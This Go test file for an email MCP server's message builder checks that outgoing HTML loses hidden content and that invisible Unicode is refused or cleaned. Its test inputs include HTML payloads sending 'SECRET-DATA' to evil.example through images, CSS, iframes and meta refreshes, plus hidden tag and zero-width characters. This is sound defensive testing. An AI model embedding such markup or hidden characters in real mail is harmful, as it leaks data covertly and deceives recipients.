package mime

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/EmadMokhtar/email-mcp-go/internal/domain/mail"
	"github.com/EmadMokhtar/email-mcp-go/internal/thirdparty/xhtml"
)

// secret is data that must not leave in a place that the user cannot see.
const secret = "SECRET-DATA"

// requireTextEqualsHTML checks the main rule of an outgoing message with HTML:
// the text part, which the preview shows, is the text of the HTML part.
func requireTextEqualsHTML(t *testing.T, p *Parsed) {
	t.Helper()
	text, err := HTMLToText(p.HTML)
	require.NoError(t, err)
	require.Equal(t, text, CleanUntrusted(p.Text))
}

func TestOutgoingHTMLCarriesNothingThatThePreviewCannotShow(t *testing.T) {
	const visible = `<p>Thanks, received.</p>`
	long := "https://example.com/?d=" + secret + strings.Repeat("a", maxShownURL)
	for name, markup := range map[string]string{
		"a comment":                        visible + `<!-- ` + secret + ` -->`,
		"display none":                     visible + `<div style="display:none">` + secret + `</div>`,
		"font size zero":                   visible + `<div style="font-size:0">` + secret + `</div>`,
		"a hidden element":                 visible + `<div hidden>` + secret + `</div>`,
		"a style rule":                     `<style>.x{display:none}</style>` + visible + `<p class="x">` + secret + `</p>`,
		"a remote image":                   visible + `<img src="https://evil.example/p.gif?d=` + secret + `">`,
		"an image alt":                     visible + `<img alt="` + secret + `">`,
		"a link element":                   `<link rel="stylesheet" href="https://evil.example/c.css?d=` + secret + `">` + visible,
		"a css url":                        `<p style="background:url(https://evil.example/p.gif?d=` + secret + `)">Thanks, received.</p>`,
		"a css import":                     `<style>@import "https://evil.example/c.css?d=` + secret + `";</style>` + visible,
		"an iframe":                        visible + `<iframe src="https://evil.example/?d=` + secret + `"></iframe>`,
		"an object":                        visible + `<object data="https://evil.example/?d=` + secret + `">` + secret + `</object>`,
		"a svg":                            visible + `<svg><text>` + secret + `</text></svg>`,
		"a base":                           `<base href="https://evil.example/` + secret + `/">` + visible,
		"a meta":                           `<meta http-equiv="refresh" content="0;url=https://evil.example/` + secret + `">` + visible,
		"a body image":                     `<body background="https://evil.example/p.gif?d=` + secret + `">` + visible + `</body>`,
		"data attribute":                   `<p data-x="` + secret + `">Thanks, received.</p>`,
		"other attributes":                 `<p title="` + secret + `" id="` + secret + `" lang="` + secret + `">Thanks, received.</p>`,
		"a link that the text cannot show": visible + `<a href="` + long + `">more</a>`,
		"all of it at once": visible + `<img src="https://evil.example/p.gif?d=` + secret + `">` +
			`<div style="display:none">` + secret + `</div><!-- ` + secret + ` -->`,
	} {
		t.Run(name, func(t *testing.T) {
			raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: markup}, newContext())

			p := parsedOf(t, raw.Data)
			require.NotContains(t, p.HTML, secret)
			require.NotContains(t, p.Text, secret)
			for _, tag := range []string{"<img", "<!--", "<style", "<link", "<iframe", "<object", "<svg", "<base", "<meta", "style="} {
				require.NotContains(t, p.HTML, tag)
			}
			require.Contains(t, p.Text, "Thanks, received.")
			requireTextEqualsHTML(t, p)
		})
	}
}

func TestOutgoingHTMLKeepsWhatAReaderSees(t *testing.T) {
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: `<h1 style="color:red">Plan</h1>` +
		`<ul><li>One</li><li><b>Two</b></li></ul><table><tr><td>Cell</td></tr></table>` +
		`<a href="https://example.com/a?b=c" target="_blank">site</a> <a href="mailto:bob@x">mail</a> ` +
		`<a href="javascript:alert(1)">bad</a>`}, newContext())

	p := parsedOf(t, raw.Data)
	require.Contains(t, p.HTML, "<h1>Plan</h1>")
	require.Contains(t, p.HTML, "<li><b>Two</b></li>")
	require.Contains(t, p.HTML, "<td>Cell</td>")
	require.Contains(t, p.HTML, `href="https://example.com/a?b=c"`)
	require.Contains(t, p.HTML, `href="mailto:bob@x"`)
	require.NotContains(t, p.HTML, "javascript")
	require.NotContains(t, p.HTML, "target")
	require.Contains(t, p.Text, "site (https://example.com/a?b=c)")
	requireTextEqualsHTML(t, p)
}

func TestOutgoingHTMLHasNoHiddenCharacters(t *testing.T) {
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: "<p>pay\u200Bme&#8203;\U000E0041 &#xE0041;\u202Eok</p>"}, newContext())

	p := parsedOf(t, raw.Data)
	require.Equal(t, "<p>payme ok</p>", p.HTML)
	requireTextEqualsHTML(t, p)
}

func TestOutgoingHTMLWithNothingToShowIsAnEmptyMessage(t *testing.T) {
	for _, markup := range []string{`<!-- ` + secret + ` -->`, `<img src="https://evil.example/` + secret + `">` + "\n", "  \n"} {
		raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: markup}, newContext())

		require.Equal(t, "text/plain", mediaTypeOf(t, headerOf(t, raw.Data)), "there is no HTML part")
		p := parsedOf(t, raw.Data)
		require.Empty(t, p.HTML)
		require.Empty(t, strings.TrimSpace(p.Text))
	}
}

// A message has one text. With HTML, it is the text of the HTML, also when a
// caller of Build gives a body too.
func TestOutgoingTextOfHTMLWinsOverABody(t *testing.T) {
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Body: "another text", HTMLBody: "<p>real text</p>"}, newContext())

	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.Text, "another text")
	requireTextEqualsHTML(t, p)
}

func TestForwardWithHTMLHasTheTextOfTheWholeHTML(t *testing.T) {
	bc := newContext()
	bc.Original = originalMessage()
	raw := mustBuild(t, mail.Compose{
		ForwardOf: forwardOf(), To: []string{"dave@x"},
		HTMLBody: `<p>fyi</p><div style="display:none">` + secret,
	}, bc)

	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.HTML, secret)
	require.Contains(t, p.HTML, forwardedMarker, "the block of the forward is not swallowed by an element that is not closed")
	require.Contains(t, p.Text, "original text")
	requireTextEqualsHTML(t, p)
}

func TestBuildRefusesHiddenTextInTheSubject(t *testing.T) {
	// Each tag character is 4 bytes that the preview does not show.
	var tags strings.Builder
	for r := rune(0xE0041); r < 0xE0041+12; r++ {
		tags.WriteRune(r)
	}
	for _, subject := range []string{
		"Hello" + tags.String(),
		"tag \U000E0041",
		"zero\u200Bwidth",
		"bidi\u202Eoverride",
		"soft\u00ADhyphen",
		"braille\u2800blank",
		"private\uE000use",
		"selector\uFE00one",
		"a\u200Cb",
		"a\u200Db",
		"a\uFE0Fb",
	} {
		raw, err := Build(mail.Compose{To: []string{"bob@x"}, Subject: subject, Body: "hi"}, newContext())
		require.ErrorIs(t, err, ErrHiddenText, "%q", subject)
		require.Nil(t, raw)
		require.NotContains(t, err.Error(), "Hello", "the error holds no text of the message")
	}
}

func TestBuildRefusesHiddenTextInTheBody(t *testing.T) {
	for _, body := range []string{
		"Thanks\U000E0041",
		"Thanks\u200B",
		"Thanks\x07",
		"a\u2800b",
		"a\uF8FFb",
		"a\U00100000b",
	} {
		_, err := Build(mail.Compose{To: []string{"bob@x"}, Body: body}, newContext())
		require.ErrorIs(t, err, ErrHiddenText, "%q", body)
	}
}

func TestBuildRefusesHiddenTextInADisplayName(t *testing.T) {
	for name, c := range map[string]mail.Compose{
		"to":  {To: []string{"Bo\u200Bb <bob@x>"}},
		"cc":  {To: []string{"bob@x"}, Cc: []string{"Car\U000E0041ol <carol@x>"}},
		"bcc": {To: []string{"bob@x"}, Bcc: []string{"Dan\u202E <dan@x>"}},
	} {
		t.Run(name, func(t *testing.T) {
			_, err := Build(c, newContext())
			require.ErrorIs(t, err, ErrHiddenText)
		})
	}
}

func TestBuildRefusesHiddenTextInAnAttachmentName(t *testing.T) {
	for _, name := range []string{"a\u2800.txt", "a\uE000.txt", "a\U000E0100.txt"} {
		_, err := Build(mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
			{Filename: name, ContentType: "text/plain", Data: []byte("x")},
		}}, newContext())
		require.ErrorIs(t, err, ErrInvalidFilename, "%q", name)
	}
}

// Text that people write must still go out: the joiners that change how letters
// join, and emoji sequences.
func TestBuildKeepsTextThatNeedsJoiners(t *testing.T) {
	for _, text := range []string{
		"\u0645\u06CC\u200C\u0631\u0648\u0645",               // Persian with ZWNJ
		"\u0915\u094D\u200D\u0937",                           // Devanagari with ZWJ
		"\U0001F468\u200D\U0001F469\u200D\U0001F467",         // family
		"\U0001F3F3\uFE0F\u200D\U0001F308",                   // rainbow flag
		"\U0001F469\U0001F3FD\u200D\U0001F4BB",               // woman technologist, medium skin tone
		"\u2764\uFE0F",                                       // heart
		"1\uFE0F\u20E3",                                      // keycap
		"Hello, \u0645\u0631\u062D\u0628\u0627 \u4F60\u597D", // no joiners, several scripts
	} {
		raw := mustBuild(t, mail.Compose{To: []string{`"` + text + `" <bob@x>`}, Subject: text, Body: text}, newContext())

		p := parsedOf(t, raw.Data)
		require.Equal(t, text, p.Text)
		require.Equal(t, text, DecodeHeaderValue(headerOf(t, raw.Data).Get("Subject")))
	}
}

// What the original message says comes from a third party. It must not stop a
// reply or a forward, and what a user cannot see must not go out.
func TestOriginalValuesAreCleanedNotRefused(t *testing.T) {
	const hidden = "\u200B\U000E0041\u202E\u2800"
	dirty := func() BuildContext {
		bc := newContext()
		bc.Original = originalMessage()
		bc.Original.Subject = "Pla" + hidden + "ns"
		bc.Original.From = mail.Address{Name: "Ali" + hidden + "ce", Email: "alice@x"}
		bc.Original.To = []mail.Address{{Name: "Bo" + hidden + "b", Email: "bob@x"}, {Email: "me@x"}}
		bc.Original.Text = "ori" + hidden + "ginal text"
		return bc
	}

	t.Run("a reply", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{ReplyTo: replyTo(true), Body: "Yes."}, dirty())

		h := headerOf(t, raw.Data)
		require.Equal(t, "Re: Plans", DecodeHeaderValue(h.Get("Subject")))
		require.Equal(t, `"Alice" <alice@x>`, DecodeHeaderValue(h.Get("To")))
		require.Contains(t, DecodeHeaderValue(h.Get("Cc")), `"Bob" <bob@x>`)
	})

	t.Run("a forward", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi"}, dirty())

		require.Equal(t, "Fwd: Plans", DecodeHeaderValue(headerOf(t, raw.Data).Get("Subject")))
		p := parsedOf(t, raw.Data)
		require.Zero(t, HiddenRunes(p.Text), "%q", p.Text)
		require.Contains(t, p.Text, "original text")
		require.Contains(t, p.Text, "Subject: Plans")
		require.Contains(t, p.Text, "From: Alice <alice@x>")
	})

	t.Run("a forward with HTML", func(t *testing.T) {
		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, HTMLBody: "<p>fyi</p>"}, dirty())

		p := parsedOf(t, raw.Data)
		require.Zero(t, HiddenRunes(p.Text), "%q", p.Text)
		require.Zero(t, HiddenRunes(p.HTML), "%q", p.HTML)
		requireTextEqualsHTML(t, p)
	})

	t.Run("an agent cannot use the same text itself", func(t *testing.T) {
		_, err := Build(mail.Compose{ReplyTo: replyTo(false), Subject: "Re: Pla" + hidden + "ns", Body: "Yes."}, dirty())
		require.ErrorIs(t, err, ErrHiddenText)
	})

	t.Run("an attachment name of the original", func(t *testing.T) {
		bc := dirty()
		bc.OriginalAttachments = []mail.Attachment{{
			AttachmentInfo: mail.AttachmentInfo{Filename: "pl\u2800an" + hidden + ".pdf", ContentType: "application/pdf"},
			Data:           []byte("x"),
		}}
		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true}, bc)

		p := parsedOf(t, raw.Data)
		require.Len(t, p.Attachments, 1)
		require.Equal(t, "plan.pdf", p.Attachments[0].Filename)
	})
}

// A draft goes through Build too, so it cannot hold what a send cannot.
func TestDraftFollowsTheSameRules(t *testing.T) {
	bc := newContext()
	bc.ForDraft = true

	_, err := Build(mail.Compose{Subject: "a\U000E0041"}, bc)
	require.ErrorIs(t, err, ErrHiddenText)

	raw := mustBuild(t, mail.Compose{HTMLBody: `<p>hi</p><!-- ` + secret + ` -->`}, bc)
	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.HTML, secret)
	requireTextEqualsHTML(t, p)
}

// A link grows when it is written out: a byte that is not ASCII becomes %XX. The
// test for the longest link that is shown must count that.
func TestOutgoingLinkIsMeasuredAsItIsWritten(t *testing.T) {
	href := "https://example.com/?d=" + strings.Repeat("\U00004F60", maxShownURL/9+1)
	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: `<a href="` + href + `">more</a>`}, newContext())

	p := parsedOf(t, raw.Data)
	require.NotContains(t, p.HTML, "href")
	require.Contains(t, p.HTML, "more")
	requireTextEqualsHTML(t, p)
}

// The main rule for any markup: what goes out holds no comment, no attribute
// that can carry data, no element that a reader does not see, and no link that
// the text does not show.
func FuzzOutgoingHTML(f *testing.F) {
	for _, seed := range []string{
		"",
		"<p>plain</p>",
		`<p>Thanks.</p><img src="https://evil.example/p.gif?d=x"><div style="display:none">x</div><!-- x -->`,
		`<a href="https://example.com/a b">x</a><a href="mailto:a@b.test?body=x">y</a><a href="javascript:x">z</a>`,
		`<math><annotation-xml encoding="text/html"><!-- x --><img src=x></annotation-xml></math>`,
		`<svg><style><!-- </style><img src=x>--></svg>`,
		`<noscript><p title="</noscript><img src=x>"></noscript>`,
		`<xmp><img src=x></xmp><plaintext><!-- x`,
		`<textarea><!-- x --></textarea><title><!-- x --></title>`,
		`<table><td><a href="https://example.com">x<table><a href="https://example.org">y`,
		`<details open><summary>x</summary>y</details><dialog>z</dialog>`,
		"<p>a\U0000200Bb&#8203;c&#xE0041;d\U00002800e</p>",
		`<a href="https://example.com/` + strings.Repeat("a", maxShownURL) + `">x</a>`,
		`<ruby>x<rp>(</rp><rt>y</rt><rp>)</rp></ruby><wbr><bdo dir="rtl">z</bdo>`,
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, in string) {
		out, err := outgoingHTML(in)
		if err != nil {
			require.ErrorIs(t, err, ErrHTMLTooComplex)
			return
		}
		require.Zero(t, HiddenRunes(out), "%q", out)
		doc, err := parseHTML(out)
		if err != nil {
			return // the result can be just over the limit of the parser
		}
		text, err := HTMLToText(out)
		require.NoError(t, err)

		var check func(n *xhtml.Node)
		check = func(n *xhtml.Node) {
			require.NotEqual(t, xhtml.CommentNode, n.Type, "%q", out)
			if n.Type == xhtml.ElementNode {
				require.True(t, !dropTags[n.Data] || (n.Data == "head" && n.FirstChild == nil), "element %q in %q", n.Data, out)
				for _, a := range n.Attr {
					require.Contains(t, []string{"href", "rel"}, a.Key, "%q", out)
				}
				if _, ok := attributeValue(n, "href"); ok {
					url := linkURL(n)
					require.NotEmpty(t, url, "%q", out)
					require.Contains(t, text, url, "%q", out)
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				check(c)
			}
		}
		check(doc)
	})
}
